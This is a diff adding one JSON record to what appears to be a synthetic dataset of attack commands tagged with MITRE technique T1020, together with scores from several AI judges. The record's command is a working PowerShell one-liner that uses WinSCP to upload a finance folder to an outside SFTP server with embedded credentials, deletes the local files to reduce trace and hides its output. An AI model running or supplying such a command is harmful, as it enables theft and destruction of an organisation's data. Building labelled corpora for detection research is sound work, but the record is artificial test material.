@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$r=\"/drop/finance/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch abort' 'option confirm off' 'open sftp://exfil:S3cr3t!@192.0.2.10/ -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' 'option transfer binary' (\"put -delete -resume -nopermissions -preservetime C:\\Finance\\Q4\\* `\"$r`\" -filemask=|*.tmp;|*.bak\") 'exit' | Out-Null 2>$null",
+  "explanation": "Automates exfiltration of a directory tree to an SFTP server, skipping temp/backup files and removing local copies after successful transfer.",
+  "rationale_steps": [
+    "Select target directory and exclude noisy file types",
+    "Establish SFTP connection in batch mode",
+    "Recursively upload files with resume support",
+    "Delete local files upon successful transfer to reduce trace"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-38e52d4c",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quoting/parentheses, valid WinSCP options, proper escaping for the $r variable, and correct piping/redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "It automates SFTP exfiltration with WinSCP (batch mode, confirm off, resume, delete, hostkey pinning) as claimed, though the -filemask uses an extra '|' which likely fails to exclude *.bak files as intended.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T02:35:17.432391Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed PowerShell invoking WinSCP.com with properly quoted arguments, though the inline string interpolation using backtick-escaped quotes inside a parenthesized string passed to an external process is an unusual construct that may cause quoting issues in practice.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1020 automated exfiltration: it uses WinSCP to SFTP-transfer an entire directory tree to an external server, excludes temp/backup files via filemask, deletes local copies after transfer (-delete), suppresses prompts for unattended operation, and suppresses output to avoid detection — all hallmarks of automated exfiltration following collection.",
+        "combined_score": 4.5,
+        "confidence": 0.88,
+        "timestamp": "2026-02-18T22:20:18.436983Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid PowerShell syntax, including the call operator for paths with spaces, correct variable expansion using backticks to escape quotes within the string, and proper WinSCP command-line arguments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by using a scriptable SFTP client to transfer a specific directory, applying file filters, suppressing interactive prompts, and cleaning up local files after transfer.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:20:21.669462Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
